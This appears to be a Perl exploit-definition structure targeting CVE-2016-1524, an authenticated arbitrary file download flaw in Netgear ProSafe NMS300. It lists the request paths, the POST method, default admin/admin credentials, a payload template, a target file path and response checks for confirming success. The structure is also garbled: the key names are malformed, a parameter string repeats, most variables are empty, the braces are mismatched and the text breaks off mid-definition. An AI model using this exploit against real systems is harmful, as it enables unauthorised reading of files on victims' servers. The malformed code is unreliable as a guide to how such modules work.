my $EXPLOIT = {
  "CVE" => "CVE-2016-1524",
  "DESCRIPTION" => "

        Netgear's ProSafe NMS300 is a network management utility that runs on Windows systems.

        The application has a file download vulnerability that can be exploited by an

        authenticated remote attacker to download any file in the system.

        This module has been tested with versions 1.5.0.2, 1.4.0.17 and 1.1.0.13.

      ",
  "METHOD" => "POST",
  "MSF_MODULE" => "netgear_auth_download",
  "PASSWORD FOR THE SPECIFIED USERTITLE" => "admin",
  "PATH" => "userSession.do?method=login&method=loginAgain&method=add&method=getPageList&type=configImgManager&",
  "PATHS" => [
    "userSession.do",
    "userSession.do",
    "data/config/image.do",
    "data/getPage.do",
    "Windows/System32/calc.exe",
  ],
  "PAYLOAD" => "everyPage=__EVERYPAGE__&",
  "REFERENCES" => [
    "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/netgear_nms_rce.txt",
    "http://seclists.org/fulldisclosure/2016/Feb/30",
  ],
  "THE USERTITLE TO LOGIN AS" => "admin",
  "TITLE" => "NETGEAR ProSafe Network Management System 300 Authenticated File Download",
  VARIABLES => {
    'PASSWORD' =>       { DESCRIPTION => "", VALUE => "" },
    'DESCRIPTION' =>       { DESCRIPTION => "", VALUE => "" },
    'REALNAME' =>       { DESCRIPTION => "", VALUE => "" },
    'EVERYPAGE' =>       { DESCRIPTION => "", VALUE => "" },
    'DEVICEMODEL' =>       { DESCRIPTION => "", VALUE => "" },
    'FILENAME' =>       { DESCRIPTION => "", VALUE => "" },
    'SINGLEID' =>       { DESCRIPTION => "", VALUE => "" },
    'TARGETURI' =>       { DESCRIPTION => "", VALUE => "" },
    'DEVICETYPE' =>       { DESCRIPTION => "", VALUE => "" },
    'VERSION' =>       { DESCRIPTION => "", VALUE => "" },
    'USERNAME' =>       { DESCRIPTION => "", VALUE => "" },
    'VENDOR' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       {
  DESCRIPTION => "Path of the file to download minus the drive letter",
  VALUE => "/Windows/System32/calc.exe",
},
  },
      },  VALIDATION => {
    'TREGEX' =>       "\"imageId\":\"\\([0-9]*\\)\",\"fileName\":\"\"",
    'TSTRING' =>       "\"success\":true",
